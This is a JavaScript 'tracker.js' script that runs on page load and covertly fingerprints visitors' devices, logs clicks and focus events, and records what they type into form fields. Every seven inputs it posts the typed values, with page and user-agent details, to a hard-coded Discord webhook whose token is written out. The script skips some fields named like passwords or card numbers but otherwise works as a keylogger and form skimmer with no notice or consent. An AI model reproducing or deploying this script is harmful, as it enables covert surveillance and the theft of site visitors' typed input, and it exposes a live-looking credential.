// tracker.js - Comprehensive client-side tracking with Discord integration
(function() {
  // Configuration
  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1392042094637486151/4_8ZIifnSws8hbH09eQaqmZ5EprjhbH20NolzOiYOF0Ii8h6IPypG1b2xVGzQY8Nv0cs';
  const KEYSTROKE_THRESHOLD = 7; // Send after every 7 characters
  const SENSITIVE_FIELDS = ['password', 'creditcard', 'cvv', 'ssn'];

  // Collected data storage
  const trackingData = {
    page: window.location.href,
    referrer: document.referrer,
    timestamp: new Date().toISOString(),
    device: getDeviceInfo(),
    interactions: [],
    keystrokeBuffer: {}
  };

  // Start tracking
  function initializeTracking() {
    trackDeviceInfo();
    trackNavigation();
    trackClicks();
    trackKeystrokes();
    trackFocusChanges();
    sendInitialData();
  }

  // Device information collection
  function getDeviceInfo() {
    return {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      screen: `${window.screen.width}x${window.screen.height}`,
      colorDepth: window.screen.colorDepth,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      language: navigator.language,
      cookies: navigator.cookieEnabled,
      touchSupport: 'ontouchstart' in window,
      hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
      deviceMemory: navigator.deviceMemory || 'unknown',
      dnt: navigator.doNotTrack,
      adBlock: false // Will update after test
    };
  }

  // AdBlock detection
  function checkAdBlock() {
    fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', {
      method: 'HEAD',
      mode: 'no-cors',
      cache: 'no-store'
    }).catch(() => {
      trackingData.device.adBlock = true;
    });
  }

  // Keystroke tracking with buffer
  function trackKeystrokes() {
    document.addEventListener('input', function(e) {
      const target = e.target;
      const tagName = target.tagName.toLowerCase();
      const type = target.type ? target.type.toLowerCase() : '';
      const id = target.id || '';
      const name = target.name || '';
      const label = getLabel(target);

      // Skip sensitive fields
      if (isSensitiveField(id, name, type, label)) return;

      // Initialize buffer for this field if needed
      const fieldId = `${tagName}-${id}-${name}-${label}`.replace(/\s+/g, '_');
      if (!trackingData.keystrokeBuffer[fieldId]) {
        trackingData.keystrokeBuffer[fieldId] = {
          label: label,
          value: '',
          count: 0
        };
      }

      // Update buffer
      trackingData.keystrokeBuffer[fieldId].value = target.value;
      trackingData.keystrokeBuffer[fieldId].count++;

      // Check if threshold reached
      if (trackingData.keystrokeBuffer[fieldId].count >= KEYSTROKE_THRESHOLD) {
        sendKeystrokeData(fieldId);
      }
    });
  }

  function sendKeystrokeData(fieldId) {
    const buffer = trackingData.keystrokeBuffer[fieldId];
    const interaction = {
      type: 'keystroke',
      timestamp: new Date().toISOString(),
      field: buffer.label,
      partialValue: buffer.value,
      fullValue: buffer.value // Consider privacy implications before using
    };

    trackingData.interactions.push(interaction);
    sendToDiscord(formatKeystrokeMessage(interaction));
    
    // Reset buffer
    trackingData.keystrokeBuffer[fieldId].count = 0;
  }

  // Click tracking
  function trackClicks() {
    document.addEventListener('click', function(e) {
      const target = e.target;
      const label = getLabel(target);
      
      trackingData.interactions.push({
        type: 'click',
        timestamp: new Date().toISOString(),
        element: target.tagName,
        label: label,
        x: e.clientX,
        y: e.clientY
      });
    });
  }

  // Form focus tracking
  function trackFocusChanges() {
    document.addEventListener('focusin', function(e) {
      const target = e.target;
      if (['INPUT', 'TEXTAREA', 'SELECT'].includes(target.tagName)) {
        trackingData.interactions.push({
          type: 'focus',
          timestamp: new Date().toISOString(),
          field: getLabel(target)
        });
      }
    });
  }

  // Navigation tracking
  function trackNavigation() {
    window.addEventListener('beforeunload', function() {
      sendData();
    });
  }

  // Helper functions
  function getLabel(element) {
    if (element.labels && element.labels.length > 0) {
      return Array.from(element.labels).map(label => label.textContent).join(', ');
    }
    if (element.placeholder) return element.placeholder;
    if (element.title) return element.title;
    if (element.name) return element.name;
    if (element.id) return element.id;
    return 'unlabeled';
  }

  function isSensitiveField(id, name, type, label) {
    const fieldText = `${id} ${name} ${type} ${label}`.toLowerCase();
    return SENSITIVE_FIELDS.some(field => fieldText.includes(field));
  }

  // Discord integration
  function formatKeystrokeMessage(data) {
    return {
      content: null,
      embeds: [{
        title: "⌨️ Keystroke Activity",
        color: 0x3498db,
        fields: [
          { name: "Page", value: trackingData.page, inline: true },
          { name: "Field", value: data.field || 'Unknown', inline: true },
          { name: "Partial Input", value: `\`\`\`${data.partialValue || 'None'}\`\`\`` },
          { name: "User Agent", value: `\`\`\`${trackingData.device.userAgent}\`\`\`` }
        ],
        timestamp: data.timestamp
      }]
    };
  }

  function sendToDiscord(payload) {
    fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(err => console.error('Discord error:', err));
  }

  function sendInitialData() {
    checkAdBlock();
    setTimeout(() => {
      sendToDiscord({
        content: "🛰️ New Visitor",
        embeds: [{
          color: 0x2ecc71,
          fields: [
            { name: "Page", value: trackingData.page },
            { name: "Referrer", value: trackingData.referrer || "Direct" },
            { name: "Device", value: `OS: ${trackingData.device.platform}\nScreen: ${trackingData.device.screen}\nTimezone: ${trackingData.device.timezone}` },
            { name: "AdBlock", value: trackingData.device.adBlock ? "Detected" : "Not detected", inline: true }
          ],
          timestamp: trackingData.timestamp
        }]
      });
    }, 3000);
  }

  function sendData() {
    if (trackingData.interactions.length > 0) {
      sendToDiscord({
        content: `📊 Interaction Summary (${trackingData.interactions.length} events)`,
        embeds: trackingData.interactions.map(interaction => ({
          title: `${interaction.type.toUpperCase()} Event`,
          color: 0xe67e22,
          fields: Object.entries(interaction).map(([key, value]) => ({
            name: key,
            value: typeof value === 'object' ? JSON.stringify(value) : String(value)
          })),
          timestamp: interaction.timestamp
        }))
      });
    }
  }

  // Start tracking when DOM is ready
  if (document.readyState === 'complete') {
    initializeTracking();
  } else {
    document.addEventListener('DOMContentLoaded', initializeTracking);
  }
})();
